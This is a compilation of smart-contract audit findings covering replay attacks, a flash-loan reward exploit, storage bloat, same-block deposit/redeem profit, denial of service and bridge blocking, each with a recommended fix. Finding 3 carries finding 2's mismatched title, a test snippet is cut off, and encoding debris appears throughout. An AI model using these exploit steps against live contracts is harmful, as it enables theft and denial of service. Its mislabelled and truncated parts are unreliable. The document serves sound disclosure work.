## 1. [Medium] EIP-155 is not enforced, allowing attackers/malicious operators to profit from replaying transactions

### Absence of enforcement of EIP-155

- Summary: Attackers and malicious operators profit from replaying transactions due to the absence of enforcement of **`EIP-155`**, which prevents replay attacks by including the chain ID in the transaction's signature.

- Impact & Recommendation: Attackers can replay transactions from networks not protected by EIP-155, while operators can replay early user transactions from other EVM networks to collect gas fees or profit directly.

## 2. [Medium] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

### ProfitManagers in different markets

- Summary: In GuildToken.sol, setting profitManager in the constructor causes problems as different markets have different ProfitManagers. Calling `notifyPnL()` with negative values from other term types triggers `notifyGaugeLoss()`, leading to reverts because the caller differs from the constructor-set ProfitManager.

- Impact & Recommendation: In GuildToken.sol, ProfitManager should be dynamically called to accommodate different ProfitManagers for each market.

    function testNotifyPnLCannotBeCalledWithNegative() public {
        // Show that for the initial gUSDC term there is no problem.
        credit.mint(address(profitManager), 10);
        profitManager.notifyPnL(term, -1);

## 3. [Medium] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

### Staking and unstaking in the same block

- Summary: A borrower initiates a loan with the minimum amount in a term without mandatory partial repayment and transfers the funds to `EXPLOITER` after interest accrual. `EXPLOITER` then utilizes a flash loan to stake the amount into the same term via SurplusGuildMinter, repays the original loan, triggering `notifyPnL()`, which reduces rewards for other Guild holders by updating the `_gaugeProfitIndex`. Finally, `EXPLOITER` unstakes and returns the flash loan.

- Impact & Recommendation: To prevent attackers from instantly accumulating rewards without being long-term stakeholders like others in the system, several protective measures can be implemented. These include disallowing staking and unstaking in the same block, introducing staking/unstaking fees, or implementing a "warm-up period" during which stakers are unable to accumulate interest.

## 4. [Medium] An attacker can bloat the Pink runtime storage with zero costs

### Bloat attack by dust accounts

- Summary: The Pink runtime's low Existential Deposit (ED) enables attackers to bloat storage with minimal cost by creating many low-balance accounts. This increases storage costs and fees for all users, posing a significant problem.

- Impact & Recommendation: Consider using a reasonable Existential Deposit. I recommend at least one¬†CENTS¬†(i.e.¬†1_000_000_000). When an account falls below the ED, it's removed from storage, resetting the nonce.

## 5. [High] Users can get immediate profit when deposit and redeem in PerpetualAtlanticVaultLP

### Calculates shares before updating the total collateral

- Summary: When a user deposits assets, the function calculates shares before updating the total collateral. This creates an opportunity for users to exploit the difference in calculations and gain immediate profits by depositing and redeeming in the same block, potentially leading to sandwich and MEV attacks.

- Impact & Recommendation: Move ¬†`perpetualAtlanticVault.updateFunding`¬† before ¬†`previewDeposit` ¬†is calculated.

## 6. [Medium] asdRouter.sol is at risk of DOS due to vulnerable implementation of NOTE address

### Hardcoding address

- Summary: The documentation advises using `CToken.underlying()` to ensure the correct NOTE token address. However, the current implementation in `asdRouter.sol` sets the noteAddress only at contract deployment, effectively hardcoding it. This poses a vulnerability as the `noteAddress` is used directly for swaps from asdUSDC to NOTE, instead of dynamically retrieving it via CToken.underlying(). Therefore, if the NOTE address changes, the `swap` and `lzcompose` functionalities will be vulnerable to denial-of-service attacks.

- Impact & Recommendation: use¬†`CNote.underlying()` instead of hardcoding.

## 7. [Medium] The time available for a canceled withdrawal should not impact future unstaking processes

### Canceled withdrawal affects future unstaking processes

- Summary: When stakers attempt to unstake their StRSR, they cannot withdraw RSR immediately; instead, their withdrawal enters a queue and becomes available after an unstaking delay period. If a withdrawal is canceled, the RSR is restaked, but the canceled withdrawal still impacts future requests. For example, if a user cancels a withdrawal during a long unstaking delay, subsequent withdrawal requests might still be affected by the canceled request, making them available later than expected.

- Impact & Recommendation: This situation could lead to funds being locked for longer than intended and create a denial-of-service (DoS) issue for users. The logic for determining the availability of withdrawals should not consider canceled withdrawals. Specifically, the code should ensure that if a user cancels a withdrawal, it does not impact the availableAt time for new withdrawals.

## 8. [High] Can block bridge or limit the bridgeable amount by initializing the ITSHub balance of the original chain

### Stop token bridging

- Summary: Attackers can block token bridging or limit the amount that can be bridged by manipulating the ITSHub balance on the original chain. The ITSHub tracks the token balances only on destination chains, not the original chain. This is because minting permissions are often registered on the original chain, making balance tracking complicated. However, attackers can initialize the original chain's balance to 0, which triggers an underflow error during token transfer, preventing tokens from being bridged out. In the InterchainTokenFactory,deployRemoteInterchainToken function, there is no check to prevent a token from being deployed back to the original chain, allowing attackers to deploy tokens from a remote chain to the original chain, causing the original chain's ITSHub balance to be initialized as zero. The ability to initialize the original chain‚Äôs balance to zero can stop token bridging or limit the amount that can be bridged. The issue is especially critical for canonical tokens, as attackers can prevent these tokens from being bridged out of the original chain, effectively locking the token in the original chain.

- Impact & Recommendation: While this issue does not involve stealing funds, it results in a DoS scenario, especially impacting canonical tokens. To prevent remote deployment requests to the original chain, `InterchainTokenFactory.deployRemoteInterchainToken` and `InterchainTokenFactory.deployRemoteCanonicalInterchainToken` should include checks to ensure that the destination chain is not the same as the original chain. When deploying directly through `InterchainTokenService.deployInterchainToken`, it's not possible to perform this check, so the original chain‚Äôs information should be stored for each tokenId in ITSHub. This will ensure that the balance of the original chain is not initialized, preventing issues related to balance manipulation and denial of service.
